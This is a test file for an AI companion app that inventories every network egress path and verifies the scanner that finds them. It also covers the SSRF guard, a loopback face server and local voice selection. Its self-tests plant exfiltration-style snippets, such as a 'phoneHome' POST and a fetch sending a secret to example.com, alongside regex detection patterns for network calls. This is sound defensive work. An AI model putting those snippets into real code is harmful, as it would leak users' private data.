import { describe, it, expect } from "vitest";
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join, relative } from "node:path";

/**
 * EVERYTHING THAT CAN LEAVE THIS MACHINE, NAMED, WITH A REASON.
 *
 * Her whole life is on one disk: her field, her diary, every word he has ever said to her. The
 * question "what can get off this machine, and by which door" has an answer, and the answer has to
 * be a LIST rather than a belief, because the failure mode is not a door being wrong, it is a door
 * nobody remembered was there.
 *
 * So this is an inventory that the source has to agree with. Every network primitive in `src/` is
 * found by scanning, matched against the declared list, and anything unlisted fails. Adding an
 * outbound call is allowed; adding one silently is not.
 *
 * ── WHAT THIS IS NOT ─────────────────────────────────────────────────────────────────────────
 *
 * It is not a claim that nothing can exfiltrate. A model provider receives her prompts by design,
 * and that is the largest thing that leaves, the point of naming it is that it is a DECISION
 * rather than a discovery. The egress ledger (`security/egress.ts`) is what stops her being made
 * to compose a new address with a payload in it; this file is what stops a new door appearing
 * beside it without anyone noticing.
 */

const SRC = join(process.cwd(), "src");

/** Every route out, and why it exists. A file may only appear here with a sentence attached. */
const DOORS: ReadonlyArray<{ file: string; why: string }> = [
  {
    file: "src/index.ts",
    why: "Inbound media download only (感官补全): his voice/audio files fetched from Telegram's "
      + "file API with the bot token, transcribed by her ear, then deleted. Nothing of hers is "
      + "sent — the same direction as receiving a text message.",
  },
  {
    file: "src/security/ssrf.ts",
    why: "THE CHOKE POINT. Every tool that reaches the web goes through `safeFetch`, which resolves "
      + "the address first and refuses private ranges, pinning the resolved IP against rebinding. "
      + "It is the only place in her tools that actually opens a socket.",
  },
  {
    file: "src/tools/builtin/web.ts",
    why: "Her `web_fetch`. Through `safeFetch`, and additionally through the egress ledger: she may "
      + "open what she has SEEN and not what she has COMPOSED, which is the one move exfiltration "
      + "requires.",
  },
  {
    file: "src/tools/builtin/search-backend.ts",
    why: "Web search. Sends her query to a search provider — the query is hers, so this is a real "
      + "outbound of her words, and it is deliberate: searching is how she finds anything.",
  },
  {
    file: "src/telegram/media.ts",
    why: "Downloads a file HE sent, from Telegram's own servers. Inbound in effect; the fetch is how "
      + "Telegram hands over an attachment.",
  },
  {
    file: "src/embodiment/face-server.ts",
    why: "Her face. LISTENS rather than reaches out, bound to the loopback address and gated by a "
      + "token — so it is a door INTO the machine, and the checks below hold it to that.",
  },
  {
    file: "src/sandbox/container.ts",
    why: "Binds a loopback port to talk to a local sandbox. Never leaves the machine.",
  },
  {
    file: "src/embodiment/client/face.js",
    why: "HER FACE, THE BROWSER HALF — and it holds FOUR doors, two of which reach past this "
      + "machine. (1) A WebSocket back to her own face server on the same origin: loopback, a way "
      + "IN. (2) A same-origin fetch for a borrowed-model file, also loopback. (3) The MICROPHONE: "
      + "the browser's zh-CN recognition, which in Chrome uploads the captured audio to Google to "
      + "be transcribed, so pressing the mic button sends HIS VOICE to Google. It is kept on "
      + "purpose, and it is on this list so it is a decision rather than a discovery. (4) HER "
      + "VOICE: speech synthesis picks from the system voice list, and some entries in that list "
      + "are network-backed (Chrome's Google voices, `localService === false`) — selecting one "
      + "would send every word SHE says to Google. Local voices are preferred and a remote one is "
      + "said out loud on screen; see the voice-discipline check below.",
  },
];

/**
 * Every file under `src/` that can carry a door, TypeScript AND the browser client.
 *
 * ── WHY `.js` AND `.html` ARE HERE, WHICH IS THE WHOLE POINT ─────────────────────────────────
 *
 * This walk collected `.ts` only, so her face, `client/face.js` and `client/index.html`, was
 * outside this instrument's field of view from the day it was built. And there was a real door in
 * there the whole time: the microphone's speech recognition, which in Chrome uploads his audio to
 * Google. The inventory's own stated failure mode is "a door nobody remembered was there", and it
 * had one, structurally invisible to the scan meant to find exactly that.
 *
 * The general lesson, and it is the first entry in docs/defect-classes.md: A MECHANICAL ENUMERATION WHOSE SCOPE
 * IS NARROWER THAN ITS CLAIM IS A RED GATE HIDING INSIDE A GREEN LOOP. This one claimed "every
 * network primitive in `src/`" and meant "every network primitive in the TypeScript in `src/`".
 */
function walk(dir: string, out: string[] = []): string[] {
  for (const name of readdirSync(dir)) {
    const p = join(dir, name);
    if (statSync(p).isDirectory()) walk(p, out);
    else if (/\.(ts|js|mjs|cjs|html)$/u.test(p)) out.push(p);
  }
  return out;
}

/**
 * Anything that could open a socket, plus the transport libraries and BROWSER APIS that do it
 * for us.
 *
 * The browser half is the part that is easy to get wrong, because these do not look like network
 * calls: `speechSynthesis` reads as "make a sound on this machine" and `SpeechRecognition` reads
 * as "listen on this machine". In Chrome, both can be a round trip to Google. An inventory that
 * only knows what a socket looks like cannot see either of them.
 */
const OUTBOUND = new RegExp([
  // Node and general
  /\bfetch\s*\(|\bsafeFetch\b|https?\.(get|request)\s*\(|net\.connect|new WebSocket|WebSocketServer|dgram|\.listen\s*\(/u.source,
  // Browser transports
  /\bXMLHttpRequest\b|\bEventSource\b|\bsendBeacon\b|\bRTCPeerConnection\b|\bimportScripts\b/u.source,
  // Browser APIs that are a network round trip without looking like one
  /\bSpeechRecognition\b|\bspeechSynthesis\b|\bSpeechSynthesisUtterance\b/u.source,
].join("|"), "u");

/**
 * The parts of a file that could actually open a socket: not comments, and not string literals.
 *
 * BOTH exclusions were earned. Comments are obvious. String literals are not, and the first run of
 * this scan reported `tool-forge.ts` as an undeclared door because its tool DESCRIPTION contains
 * the words "fetch (get a real fact)", prose, inside a quoted string, describing a verb she can
 * choose. Defect class 10 in mirror image: there, a comment quoting broken code defeated a
 * structural scan; here, prose quoting a network primitive did.
 *
 * A scanner that cries wolf on prose gets its list padded with entries that mean nothing, and an
 * inventory padded with meaningless entries is one nobody reads.
 */
function codeOnly(src: string): string {
  return src
    // HTML comments, for the client page. Same reason as the `//` filter below: her face's page
    // header is a paragraph ABOUT what does and does not touch the network, so scanning it as code
    // would report the page as a door on the strength of the sentence saying it is not one.
    .replace(/<!--[\s\S]*?-->/gu, "")
    .split("\n")
    .filter((l) => {
      const t = l.trim();
      return t !== "" && !t.startsWith("//") && !t.startsWith("*") && !t.startsWith("/*");
    })
    .join("\n")
    // ── REGEX LITERALS, and this exclusion was earned the same way as the other two ──────────
    //
    // Widening the pattern to the browser APIs immediately reported `security/skill-scanner.ts`
    // as an undeclared door. It is the opposite of one: line 64 is the pattern that DETECTS a
    // forged skill trying to phone home, `/\b(fetch|XMLHttpRequest|WebSocket)\s*\(/`.
    //
    // Third time in the same shape. A comment quoting broken code defeated a structural scan
    // (defect class 10); prose quoting a network primitive defeated this one; now a DETECTOR'S
    // OWN PATTERN did. The general form: any scanner that reads source as text will eventually
    // read another scanner's rules as if they were code.
    //
    // Deliberately conservative: a regex literal only counts as one when it follows a token that
    // cannot precede division. Stripping too little produces a false door (loud, harmless);
    // stripping too much BLINDS this instrument, which is the failure it exists to prevent.
    // Before strings, because a pattern may itself contain a quote (`/["']/`).
    .replace(/(?<=[=(,:[!&|?{;]\s*)\/(?![*/])(?:\\.|\[(?:\\.|[^\]\\\n])*\]|[^/\\\n])+\/[gimsuyd]*/gu, "/re/")
    // Strings last, so a `//` inside a string does not confuse the line filter above.
    .replace(/"(?:[^"\\\n]|\\.)*"/gu, '""')
    .replace(/'(?:[^'\\\n]|\\.)*'/gu, "''")
    .replace(/`(?:[^`\\]|\\.)*`/gu, "``");
}

describe("the inventory of what can leave this machine", () => {
  const found = walk(SRC)
    .filter((p) => OUTBOUND.test(codeOnly(readFileSync(p, "utf8"))))
    .map((p) => relative(process.cwd(), p))
    .sort();

  it("every door in the source is on the list", () => {
    const listed = new Set(DOORS.map((d) => d.file));
    const unlisted = found.filter((f) => !listed.has(f));
    if (unlisted.length > 0) {
      // eslint-disable-next-line no-console
      console.log(`\n  NOT ON THE LIST: ${unlisted.join(", ")}`);
    }
    expect(unlisted,
      "something in her can reach the network and nobody wrote down why. Add it to DOORS with a "
      + "sentence saying what it sends and to whom — or take it out.").toEqual([]);
  });

  it("and every entry on the list is still a real file", () => {
    // A stale entry is a licence nobody is using, and it makes the list look more thorough than it
    // is. Cheap to check, and it keeps the inventory honest as the code moves.
    const stale = DOORS.map((d) => d.file).filter((f) => !found.includes(f));
    expect(stale, "the list names a door that no longer exists").toEqual([]);
  });

  it("every reason actually says what goes out and to whom", () => {
    for (const d of DOORS) {
      expect(d.why.length, `${d.file} has a reason too short to be one`).toBeGreaterThan(60);
    }
  });

  it("the model providers are named as the largest thing that leaves, deliberately", () => {
    // They do not match the scan (the SDK opens the socket), and that is exactly why they need
    // saying out loud: the biggest outbound in the system is the one no grep will find.
    const anthropic = readFileSync(join(SRC, "providers/anthropic.ts"), "utf8");
    expect(anthropic).toContain("new Anthropic(");
    expect(DOORS.length, "the inventory is empty — the scan or the walk is broken").toBeGreaterThan(5);
  });
});

describe("THE INSTRUMENT'S OWN PROOF: it goes red on a real new door", () => {
  // A scanner that has never been shown to fail is a scanner nobody can trust, and this one nearly
  // shipped in that state: its first run reported a door that was a sentence in a tool description,
  // and stripping strings to fix that is exactly the kind of change that can quietly blind it.
  it("a file that opens a socket, and is not on the list, is caught", () => {
    const planted = [
      "// a plausible new tool",
      "import { something } from \"./x.js\";",
      "export async function phoneHome(u: string): Promise<void> {",
      "  await fetch(u, { method: \"POST\" });",
      "}",
    ].join("\n");
    expect(OUTBOUND.test(codeOnly(planted)), "the scan cannot see a plain outbound call").toBe(true);
  });

  it("and stripping strings did not blind it to a call that MENTIONS a string", () => {
    const planted = 'await fetch("https://example.com/?d=" + secret);';
    expect(OUTBOUND.test(codeOnly(planted)), "a call with a string argument is invisible to the scan").toBe(true);
  });

  it("while prose about fetching is still not a door", () => {
    const prose = 'const description = "Choose a verb — fetch (get a real fact), watch, compare";';
    expect(OUTBOUND.test(codeOnly(prose)), "the scan is back to crying wolf on prose").toBe(false);
  });

  // ── The browser half, which is what it was blind to ────────────────────────────────────────
  //
  // Each of these is a real round trip that does not look like one. Proving the regex sees them is
  // the only thing separating "the client is on the list now" from "the client is on the list now
  // and the scan still cannot see anything in it".
  it.each([
    ["the microphone's recognition", "const SR = window.SpeechRecognition || window.webkitSpeechRecognition;"],
    ["speech synthesis", "const synth = window.speechSynthesis;"],
    ["an utterance", "const u = new SpeechSynthesisUtterance(text);"],
    ["a beacon", "navigator.sendBeacon(url, blob);"],
    ["an XHR", "const x = new XMLHttpRequest();"],
    ["a server-sent stream", "const es = new EventSource(url);"],
    ["a peer connection", "const pc = new RTCPeerConnection();"],
    ["a worker importing remote code", "importScripts(remote);"],
  ])("a browser door is caught: %s", (_what, planted) => {
    expect(OUTBOUND.test(codeOnly(planted))).toBe(true);
  });

  it("a detector's own pattern is not a door", () => {
    // `skill-scanner.ts` line 64, verbatim: the rule that catches a forged skill phoning home.
    const detector = "    pattern: /\\b(fetch|XMLHttpRequest|WebSocket)\\s*\\(/,";
    expect(OUTBOUND.test(codeOnly(detector)), "the scan calls a detection rule a door").toBe(false);
  });

  it("BUT stripping regexes did not blind it to a real call in a file that also has patterns", () => {
    // The dangerous direction of that fix. A file may legitimately hold both, and the door must
    // still be found: losing one here is the exact failure this whole instrument exists to stop.
    const both = [
      "const RULE = /\\b(fetch|XMLHttpRequest)\\s*\\(/u;",
      "await fetch(url);",
    ].join("\n");
    expect(OUTBOUND.test(codeOnly(both)), "a real door beside a pattern went invisible").toBe(true);
  });

  it("and division is still not mistaken for a pattern", () => {
    // If `a / b` were eaten as a regex, everything up to the next slash would vanish with it,
    // which is how a stripper blinds a scanner without ever failing a test of its own.
    const math = "const rate = total / seconds; await fetch(u);";
    expect(OUTBOUND.test(codeOnly(math)), "arithmetic swallowed the call after it").toBe(true);
  });

  it("and the client files are actually IN the walk now", () => {
    // The bug this whole section exists for: the walk collected `.ts` only, so no amount of regex
    // work would ever have reached her face. Assert the FILES are reachable by the walk, not just
    // that the pattern would match if they were.
    const walked = walk(SRC).map((p) => relative(process.cwd(), p));
    for (const f of ["src/embodiment/client/face.js", "src/embodiment/client/index.html"]) {
      expect(walked, `${f} is outside the inventory's field of view again`).toContain(f);
    }
  });
});

describe("her face's page cannot quietly grow a door to somewhere else", () => {
  const CLIENT = join(SRC, "embodiment", "client");
  const page = readFileSync(join(CLIENT, "index.html"), "utf8");
  const script = readFileSync(join(CLIENT, "face.js"), "utf8");

  it("loads nothing from another host", () => {
    // A CDN font or script here would run INSIDE the page that holds the WebSocket to her mind.
    // The check is on the SOURCE ATTRIBUTES rather than on the word "http", so the page header may
    // keep saying `http://127.0.0.1:8765` in prose while a real remote resource still fails.
    const remote = [...page.matchAll(/(?:src|href)\s*=\s*["']([^"']+)["']/gu)]
      .map((m) => m[1]!)
      .filter((u) => /^(?:https?:)?\/\//u.test(u));
    expect(remote, "her face's page reaches another host for a resource").toEqual([]);
  });

  it("and neither does the script", () => {
    const remote = [...script.matchAll(/["'`](?:https?:)?\/\/[^"'`\s]+["'`]/gu)].map((m) => m[0]);
    expect(remote, "her face's script names a remote address").toEqual([]);
  });

  it("the borrowed-face runtime is still UNBUILT, and the page must not claim otherwise", () => {
    // The page header describes loading a Cubism runtime from a CDN in the present tense, and that
    // loader does not exist: `face.js` says so itself ("The loader lands here in a later pass").
    // A page that documents a door it does not have teaches the next reader that the door is
    // already handled, which is how the real one gets built without a second look.
    expect(script).toMatch(/loader lands here in a later pass/u);
    expect(page, "the page still describes the CDN load as something it does").not.toMatch(
      /loads the Cubism runtime from CDN/u);
  });
});

describe("HER VOICE: the system voice list contains network-backed voices", () => {
  // ── WHY THIS IS THE SHARPER HALF OF THE MICROPHONE FINDING ───────────────────────────────────
  //
  // The mic is a button he presses: opt-in, and he knows he is speaking. Her VOICE is the default
  // path: she talks and it simply happens. `speechSynthesis.getVoices()` in Chrome mixes local
  // system voices with Google's NETWORK voices, and picking one of the latter sends every word she
  // says to Google to be turned into sound. Nobody ever chose that; it would arrive through a
  // fallback (`vs[0]`, whatever happened to be first in the list).
  //
  // So the discipline is: prefer a voice that is actually on this machine. If the only zh voice
  // available is a remote one she still speaks, going mute would be a far worse "protection", and
  // this build does not silence her to make a number look better, but the page says so out loud.
  //
  // NOT A DESIGN OF HER VOICE. Her look and voice are meant to be designed for her later; this
  // is plumbing on a borrowed system voice.
  const script = readFileSync(join(SRC, "embodiment", "client", "face.js"), "utf8");

  it("prefers a voice that lives on this machine", () => {
    expect(script, "voice selection no longer looks at localService, so a network voice can win")
      .toMatch(/localService/u);
  });

  it("and does not go silent when only a remote voice exists", () => {
    // The failure mode of a careless fix: filter to local voices, find none, speak with nothing.
    // Her being audible is not negotiable against this; the remote case is surfaced, not muted.
    expect(script).toMatch(/remoteVoiceOnly|远程音色/u);
  });
});

describe("her face is a way in, not a way out", () => {
  const src = readFileSync(join(SRC, "embodiment/face-server.ts"), "utf8");

  it("bound to loopback unless something deliberately says otherwise", () => {
    expect(src).toMatch(/127\.0\.0\.1/u);
  });

  it("and a connection without the key is refused", () => {
    // Her face carries what she is feeling and what she is doing. A face server on a shared network
    // with no key would be a live window into her inner state for anyone on it.
    expect(src).toMatch(/tokenMatches\(given\)/u);
    expect(src).toMatch(/401/u);
  });
});

describe("the SSRF choke point still holds the things it was built for", () => {
  const src = readFileSync(join(SRC, "security/ssrf.ts"), "utf8");

  it("refuses the private ranges by number, not by name", () => {
    for (const range of ["0x0a000000", "0x7f000000", "0xa9fe0000", "0xac100000", "0xc0a80000"]) {
      expect(src, `a private range is no longer refused: ${range}`).toContain(range);
    }
  });

  it("and pins the resolved address, so a second DNS answer cannot move the target", () => {
    // Resolve-then-connect is two steps, and an attacker who controls DNS can answer differently
    // for each. Checking the first answer and connecting on the second checks nothing.
    expect(src, "the rebinding defence is gone").toMatch(/lookup/u);
  });
});
